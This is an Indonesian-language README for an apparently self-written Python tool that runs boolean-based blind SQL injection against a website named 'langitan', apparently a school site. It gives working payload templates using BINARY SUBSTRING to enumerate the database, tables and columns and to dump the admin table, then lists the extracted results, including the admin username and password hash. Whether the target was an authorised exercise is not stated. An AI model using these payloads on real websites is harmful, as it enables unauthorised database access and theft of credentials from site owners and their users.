
## Blind SQL Injection

Tools ini dibuat menggunakan bahasa Python untuk melakukan Blind SQL Injection terhadap website *langitan* yang diberikan.  
Tools ini melakukan brute-force terhadap setiap karakter dari hasil query SQL, memanfaatkan response dari server untuk mengetahui apakah tebakan karakter benar atau salah.

### Library yang Digunakan:
- `requests` untuk melakukan HTTP request
- `sys` untuk output karakter satu per satu ke console
- `urllib3`, `os`, `time` untuk mendukung pengiriman request dan pengelolaan sistem

---

## Teknik SQL Injection

- **Jenis:** Blind SQL Injection (Boolean-based)  
- **Metode:** Menggunakan `BINARY SUBSTRING` untuk mengekstrak informasi satu karakter per satu karakter.

### Contoh Payload:

- **Database:**  
  `'admin' AND BINARY SUBSTRING(DATABASE(), {i}, 1) = '{chr(c)}' -- -`

- **Tabel:**  
  `'admin' AND BINARY SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='db_larangan'), {i}, 1) = '{chr(c)}' -- -`

- **Kolom:**  
  `'admin' AND BINARY SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='db_larangan' AND table_name='admin'), {i}, 1) = '{chr(c)}' -- -`

- **Data:**  
  `'admin' AND BINARY SUBSTRING((SELECT group_concat(username, ':', password) FROM admin), {i}, 1) = '{chr(c)}' -- -`

---

## Hasil yang Diperoleh

- **Nama Database:** `db_larangan`
- **Nama Tabel:**  
  `admin, agenda, album, alumni, berita, galeri, guru, kategori_link, kelas, link, mapel, materi, pengumuman, profil, siswa, siswa_kelas`
- **Kolom Tabel admin:**  
  `id_admin, username, password`
- **Data pada Tabel admin:**  
  `admin:21232f297a57a5a743894a0e4a801fc3`
